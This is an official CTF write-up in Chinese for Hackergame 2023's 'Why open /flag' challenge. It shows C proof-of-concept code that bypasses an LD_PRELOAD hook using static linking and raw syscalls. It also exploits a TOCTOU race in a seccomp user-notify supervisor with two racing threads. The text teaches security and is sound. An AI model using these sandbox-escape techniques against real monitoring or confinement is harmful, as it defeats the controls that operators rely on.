# 为什么要打开 /flag 😡

题解作者：[taoky](https://github.com/taoky)

出题人、验题人、文案设计等：见 [Hackergame 2023 幕后工作人员](https://hack.lug.ustc.edu.cn/credits/)。

## 题目描述

- 题目分类：binary

- 题目分值：LD_PRELOAD, love!（200）+ 都是 seccomp 的错（250）

> 至少见一面让我当面道歉好吗？😭我也吓了一跳，没想到事情会演变成那个样子……😭所以我想好好说明一下😭我要是知道就会阻止它们的，但是明明文件描述符都已经关闭了突然间开始 `open()`😭没能阻止大家真是对不起……😭你在生气对吧……😭我想你生气也是当然的😭但是请你相信我。`/flag`，本来没有在我们的预定打开的文件里的😭真的很对不起😭我答应你再也不会随意打开文件了😭我会让各个函数保证再也不打开这个文件😭能不能稍微谈一谈？😭我真的把这里的一切看得非常重要😭所以说，擅自打开 `/flag` 的时候我和你一样难过😭我希望你能明白我的心情😭拜托了。我哪里都会去的😭我也会好好跟你说明我不得不这么做的理由😭我想如果你能见我一面，你就一定能明白的😭我是你的同伴😭我好想见你😭

---

挽留失败后，她决定在程序启动时做些手脚，让所有访问 `/flag` 的请求都以某种方式变成打开 `/fakeflag` 的请求。

「我不会再打开 `/flag` 了」。真的吗？

[题目附件下载](files/fakeflag-backend.zip)（第二小题需要 Linux kernel >= 5.9）

## 题解

这道题目的起源是我当时需要 hook 某个函数的库调用/系统调用，具体来讲，镜像站有多个出口，所以希望在同步的时候能控制程序 `bind()` 到哪个出口 IP 地址，有些程序不给这种配置，那就只能用更 hack 的方法去做了。并且我也读了今年 USENIX ATC 的 best paper 之一——[zpoline](https://www.usenix.org/conference/atc23/presentation/yasukata)，想着要不把这个搞成题目好了。

虽然因为一些安全性上的考虑，zpoline 最后没有出成（因为需要 `/proc/sys/vm/mmap_min_addr` 设置为 0），配个 qemu 又太麻烦了。但是强烈推荐去读这篇论文，它解决这个问题的思路特别有意思（虽然也没有安全性的保证）。

### `LD_PRELOAD`

在**动态链接**的程序执行之前，动态链接器（`ld.so` 或者 `ld-linux.so`）会处理 `LD_PRELOAD` 环境变量。具体的动态链接器可以通过 ldd 观察到：

```console
> ldd a.out
	linux-vdso.so.1 (0x00007fff757a3000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007fbf61331000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbf61565000)
```

`ld-linux.so` 甚至可以直接执行：

```
> /lib64/ld-linux-x86-64.so.2 --help
Usage: /lib64/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked 'ld.so', the program interpreter for dynamically-linked
ELF programs.  Usually, the program interpreter is invoked automatically
when a dynamically-linked executable is started.

You may invoke the program interpreter program directly from the command
line to load and run an ELF executable file; this is like executing that
file itself, but always uses the program interpreter you invoked,
instead of the program interpreter specified in the executable file you
run.  Invoking the program interpreter directly provides access to
additional diagnostics, and changing the dynamic linker behavior without
setting environment variables (which would be inherited by subprocesses).

  --list                list all dependencies and how they are resolved
  --verify              verify that given object really is a dynamically linked
                        object we can handle
  --inhibit-cache       Do not use /etc/ld.so.cache
  --library-path PATH   use given PATH instead of content of the environment
                        variable LD_LIBRARY_PATH
  --glibc-hwcaps-prepend LIST
                        search glibc-hwcaps subdirectories in LIST
  --glibc-hwcaps-mask LIST
                        only search built-in subdirectories if in LIST
  --inhibit-rpath LIST  ignore RUNPATH and RPATH information in object names
                        in LIST
  --audit LIST          use objects named in LIST as auditors
  --preload LIST        preload objects named in LIST
  --argv0 STRING        set argv[0] to STRING before running
  --list-tunables       list all tunables with minimum and maximum values
  --list-diagnostics    list diagnostics information
  --help                display this help and exit
  --version             output version information and exit

This program interpreter self-identifies as: /usr/lib/ld-linux-x86-64.so.2

Shared library search path:
  (libraries located via /etc/ld.so.cache)
  /usr/lib (system search path)

Subdirectories of glibc-hwcaps directories, in priority order:
  x86-64-v4
  x86-64-v3 (supported, searched)
  x86-64-v2 (supported, searched)
```

以上 `LD_PRELOAD` 的细节也可以在 `man ld.so` 中找到。既然 `ld.so` 会加载加了私货的库，那么两种思路是：

1. 既然动态链接器要动手脚，那我**静态链接**不就行了？
2. 就算动态链接，那我直接 `syscall` 汇编，不调你的库不就行了？

前者相对简单很多，写一个读 `/flag` 的 C 程序，然后直接：

```console
gcc -static your_program.c
```

就成了。如果嫌太大，那就和 musl 静态链接（`musl-gcc -static your_program.c`）。注意和 musl 动态链接是不行的，运行的时候动态链接器找不到 musl，会抱怨 `No such file or directory`。后者的话，因为 `syscall()` 这个函数也被 ban 了，所以得手写汇编（以下是直接拿去年[「杯窗鹅影」的题解](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E6%9D%AF%E7%AA%97%E9%B9%85%E5%BD%B1/README.md#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)改的）：

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

int main() {
    char *filename = "/flag";
    printf("filename: %p\n", filename);
    uint64_t fd;
    __asm__ ("mov %1, %%rdi \n\t"     // filename
             "mov $0, %%rsi \n\t"     // flags (0)
             "mov $0, %%rdx \n\t"     // mode (0)
             "mov $2, %%rax \n\t"     // open (2)
             "syscall \n\t"
             "mov %%rax, %0"          // fd
             : "=r" (fd)
             : "m" (filename)
             : "%rax", "%rdi", "%rsi", "%rdx"
             );
    printf("fd: %d\n", fd);
    if (fd > 0) {
        char buf[50];
        read(fd, buf, 50);
        buf[50] = '\0';
        printf("%s\n", buf);
    }
    return 0;
}
```

当然了，如果能找到 `lib.c` 没有考虑到的地方，然后读 `/flag`，我想也是完全可行的。

#### 非预期解

`lib.c` 中并没有对 `open64()` 函数做手脚，因此可以通过此函数读取到 flag 内容并输出。

### Seccomp User Notify

第二题需要看一段 Rust 代码，不过第一行就是：

```rust
// This source code modifies code from [greenhook crate](https://crates.io/crates/greenhook).
```

所以可以先看一下这个 crate。其实解法甚至 README 里面就写了，但是就算没有看到，也可以注意到这个 crate 使用了 `seccomp_unotify(2)`（Seccomp user-space notification mechanism）。阅读手册可以注意到：

```
..... Note that this mechanism is
explicitly **not** intended as a method implementing security policy;
see NOTES.

......

Design goals; use of SECCOMP_USER_NOTIF_FLAG_CONTINUE

    **Note well**: this mechanism must not be used to make security
    policy decisions about the system call, which would be inherently
    race-prone for reasons described next.

    ......

    ...... However, there is a time-of-check, time-of-use race
    here, since an attacker could exploit the interval of time where
    the target is blocked waiting on the "continue" response to do
    things such as rewriting the system call arguments.

    Note furthermore that a user-space notifier can be bypassed if
    the existing filters allow the use of seccomp(2) or prctl(2) to
    install a filter that returns an action value with a higher
    precedence than SECCOMP_RET_USER_NOTIF (see seccomp(2)).

    It should thus be absolutely clear that the seccomp user-space
    notification mechanism **can not** be used to implement a security
    policy!  It should only ever be used in scenarios where a more
    privileged process supervises the system calls of a lesser
    privileged target to get around kernel-enforced security
    restrictions when the supervisor deems this safe.  In other
    words, in order to continue a system call, the supervisor should
    be sure that another security mechanism or the kernel itself will
    sufficiently block the system call if its arguments are rewritten
    to something unsafe.
```

然后看一下这坨 Rust 代码，可以注意到在 `main()` 里：

```rust
let mut supervisor = Supervisor::new(1).unwrap();
supervisor.insert_handler(ScmpSyscall::new("open"), |req| opening_handler(0, req));
supervisor.insert_handler(ScmpSyscall::new("openat"), |req| opening_handler(1, req));
```

这个 handler 的代码：

```rust
fn opening_handler(path_pos: usize, req: &UNotifyEventRequest) -> libseccomp::ScmpNotifResp {
    let path = req.get_request().data.args[path_pos];
    let remote = RemoteProcess::new(Pid::from_raw(req.get_request().pid as i32)).unwrap();
    let mut buf = [0u8; 256];
    remote.read_mem(&mut buf, path as usize).unwrap();
    // debug!("open (read from remote): {:?}", buf);
    let path = CStr::from_bytes_until_nul(&buf).unwrap();
    if !req.is_valid() {
        return req.fail_syscall(libc::EACCES);
    }
    info!("open (path CStr): {:?}", path);
    if path.to_str().unwrap().contains("flag") {
        let file = match File::open("/fakeflag") {
            Ok(file) => file,
            Err(e) => {
                error!("failed to open /fakeflag: {}", e);
                return req.fail_syscall(libc::EACCES);
            }
        };
        let fd = file.as_raw_fd();
        let remote_fd = req.add_fd(fd).unwrap();
        req.return_syscall(remote_fd as i64)
    } else {
        req.continue_syscall()
    }
}
```

可以发现，这个 handler 首先会从被挂的程序内存读取 `open()` 或者 `openat()` 的路径，然后判断路径里面有没有 `flag`，如果有，就打开 `/fakeflag`，然后把这个 fd 塞回去，否则就允许这个系统调用继续执行。那么正如手册所言，存在 TOCTOU（Time Of Check, Time Of Use）的风险。怎么在它等系统调用的时候改内存呢？阅读手册的程序例子可以看到：

```c
/* Even if the target's system call was not interrupted by a signal,
    we have no guarantees about what was in the memory of the target
    process. (The memory may have been modified by another thread, or
    even by an external attacking process.) We therefore treat the
    buffer returned by pread() as untrusted input. The buffer should
    contain a terminating null byte; if not, then we will trigger an
    error for the target process. */
```

所以当一个线程在执行系统调用的时候，另一个线程并不会静止，这个时候，如果 supervisor 读到的是不在读 `/flag`，但是 check 之后，continue 之前另一个线程把路径改成了 `/flag`，就能读到了。这个 PoC 用 Rust 好像不太方便写出来，所以还是 C 好了：

```c
#include <stdio.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

char flagfile[] = "/flag";

void *read_file() {
    char buf[100] = {};
    while (1) {
        int f = open(flagfile, O_RDONLY);
        if (!f) {
            continue;
        }
        read(f, buf, 99);
        if (buf[0] && buf[0] != 'I') {
            printf("%s\n", buf);
            exit(0);
        }
        close(f);
    }
}

void *modify() {
    struct timespec req;
    req.tv_sec = 0;
    req.tv_nsec = 50;
    while (1) {
        flagfile[1] = 'a';
        // sleep is not allowed. So just don't sleep.
        // nanosleep(&req, NULL);
        flagfile[1] = 'f';
    }
}

int main() {
    printf("pthread\n");
    pthread_t t1, t2;
    pthread_create(&t1, NULL, read_file, NULL);
    pthread_create(&t2, NULL, modify, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    printf("done?\n");
    return 0;
}
```

另一个要绕过的点是 seccomp 白名单很严格。除了 `open()` 和 `openat()` 只允许这些：

```rust
const ALLOWLIST: &[&str] = &[
    "brk",
    "arch_prctl",
    "access",
    "newfstatat",
    "mmap",
    "close",
    "read",
    "pread64",
    "set_tid_address",
    "exit_group",
    "set_robust_list",
    "rseq",
    "mprotect",
    "prlimit64",
    "munmap",
    "getrandom",
    "sendmsg",
    "write",
    "execve",
    "getdents64",
    "statx",
    "ioctl",
    "lseek",
    "rt_sigprocmask",
    "futex",
    "writev",
    "clone",
];
```

因为没放行 `clone3()`，所以 glibc 版本编译的可能没法直接用，musl 会用 `clone()` 所以可以直接用。手册中提到的另一种绕过方法应该是不可行的，因为没有放行 `seccomp()` 或者 `prctl()`。

## 其他

写 seccomp user notify 代码的时候第一次知道 Unix socket 可以传文件描述符，感觉很有意思。虽然其实这个 Rust 代码的实现实话讲还有很大的优化空间。

这道题的题目文案也是我自己写的（包括小题名字也在玩梗
